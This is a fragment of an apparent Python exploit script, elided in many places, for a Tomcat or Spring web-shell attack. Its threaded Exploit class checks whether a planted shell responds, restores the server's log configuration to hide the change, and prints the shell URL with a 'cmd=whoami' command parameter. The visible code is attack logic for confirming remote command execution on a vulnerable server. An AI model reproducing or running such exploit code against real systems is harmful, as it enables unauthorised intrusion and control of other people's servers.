...
class Exploit(Thread):
    ...
    def run(self):
        ...
        try:
            ...
            if shellgo.status_code == 200:
                self.send_post(clean_data,headers)
                print("log config restored successfully，will be effective after restart. ")
                print(f"\033[92m[" + '\u2713' + "]\033[0m" + " Vulnerable，shell url: ", shellurl+"?pwd=j&cmd=whoami")
            ...
            # Depending on the server, the shell url may be in tomcats root folder
                ...
                if shellgoroot.status_code == 200:
                    self.send_post(clean_data,headers)
                    print("log config restored successfully，will be effective after restart. ")
                    print(f"\033[92m[" + '\u2713' + "]\033[0m"+" Vulnerable，shell url: ",shellurlroot+"?pwd=j&cmd=whoami")
                else:
    ...
    def send_post(self, data, headers):
